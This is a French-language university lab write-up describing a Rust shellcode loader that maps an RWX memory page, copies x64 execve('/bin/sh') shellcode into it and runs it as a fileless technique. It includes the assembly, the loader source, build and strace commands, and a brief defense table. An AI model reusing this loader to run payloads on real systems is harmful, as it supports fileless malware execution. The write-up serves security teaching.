# Write-up — Lab 17 : Rust Shellcode Loader (mmap + exec)

> **Embedded Security — Rust Malware Dev**
> Ngagne Demba Dia · AngeVirusLab · Master Sécurité des Systèmes Embarqués · UCAD · 2026

[![Rust](https://img.shields.io/badge/lang-Rust-orange.svg)]()
[![mmap](https://img.shields.io/badge/technique-mmap%20RWX-red.svg)]()
[![Shellcode](https://img.shields.io/badge/shellcode-execve-blue.svg)]()
[![Solved](https://img.shields.io/badge/Lab-Solved-brightgreen.svg)]()

---

## 1. TL;DR

**Contexte :** Charger et exécuter du shellcode en mémoire sans fichier sur le disque — technique de base du malware fileless  
**Technique :** `mmap(PROT_RWX)` → `copy_nonoverlapping` → `transmute` → `fn()`  
**Résultat :** Shell interactif via shellcode x64 exécuté depuis une page mémoire RWX

---

## 2. Concept : shellcode loader

```
┌─────────────────────────────────────────────────────┐
│  Loader                                             │
│                                                     │
│  1. mmap(NULL, len, RWX, PRIVATE|ANON, -1, 0)      │
│     → alloue une page exécutable                    │
│                                                     │
│  2. copy_nonoverlapping(shellcode → page)           │
│     → copie les opcodes                             │
│                                                     │
│  3. transmute(page) → fn()                          │
│     → cast du pointeur en fonction Rust             │
│                                                     │
│  4. fn()  → CALL → shellcode → execve("/bin/sh")   │
└─────────────────────────────────────────────────────┘
```

**Différence avec Lab11 :** Lab11 injecte le shellcode via un overflow stack. Lab17 est un loader autonome — le shellcode est embarqué dans le binaire et chargé proprement via mmap.

---

## 3. Shellcode — x64 execve, 26 bytes

```asm
xor rsi, rsi                      ; argv = NULL
xor rdx, rdx                      ; envp = NULL
movabs rbx, 0x0068732f6e69622f    ; "/bin/sh\0"
push rbx
mov rdi, rsp                      ; rdi = &"/bin/sh"
mov eax, 59                       ; SYS_execve
syscall
```

---

## 4. Code — `loader/src/main.rs`

```rust
use libc::{mmap, MAP_ANONYMOUS, MAP_PRIVATE, PROT_EXEC, PROT_READ, PROT_WRITE};

const SHELLCODE: &[u8] = &[ /* 26 bytes execve */ ];

fn main() {
    unsafe {
        let page = mmap(
            std::ptr::null_mut(),
            SHELLCODE.len(),
            PROT_READ | PROT_WRITE | PROT_EXEC,
            MAP_PRIVATE | MAP_ANONYMOUS,
            -1, 0,
        );

        std::ptr::copy_nonoverlapping(SHELLCODE.as_ptr(), page as *mut u8, SHELLCODE.len());

        let exec: fn() = std::mem::transmute(page);
        exec();
    }
}
```

---

## 5. Compilation et exécution

```bash
cd loader
cargo build --release

./target/release/loader
# [*] Shellcode loader — 26 bytes
# [+] Page RWX allouée @ 0x7f...
# [*] Shellcode copié
# [+] Exécution du shellcode...
# $ id
# $ whoami
```

---

## 6. Analyse

```bash
# Vérifier que la page RWX est bien allouée
cat /proc/<pid>/maps | grep rwx

# strace — voir les syscalls
strace ./target/release/loader
# mmap(NULL, 26, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x7f...
# execve("/bin/sh", NULL, NULL) = 0
```

---

## 7. Comparaison des techniques shellcode

| Technique | Lab | Vecteur |
| --- | --- | --- |
| Stack injection via overflow | Lab11 | mprotect + ret |
| ptrace injection | Lab15 | POKETEXT |
| **mmap loader autonome** | **Lab17** | **mmap RWX direct** |

---

## 8. Défense

| Vecteur | Mesure |
| --- | --- |
| mmap RWX | Interdire via seccomp — `mmap` avec `PROT_EXEC` bloqué |
| Shellcode embarqué | AV signature — scanner les sections .rodata |
| transmute fn ptr | Détection comportementale — exécution depuis heap/mmap |

---

## Résumé technique

| Élément | Valeur |
| --- | --- |
| Allocation | `mmap(PROT_READ\|WRITE\|EXEC, MAP_ANON)` |
| Copie | `ptr::copy_nonoverlapping` |
| Exécution | `std::mem::transmute` → `fn()` |
| Shellcode | 26 bytes — execve("/bin/sh") |
| Technique | Fileless — aucun fichier temporaire |

> Screenshot : [docs/lab17_shellcode_loader.png](docs/lab17_shellcode_loader.png)

---

*Ngagne Demba Dia · AngeVirusLab · Master Sécurité des Systèmes Embarqués · UCAD · Dakar, 2026*
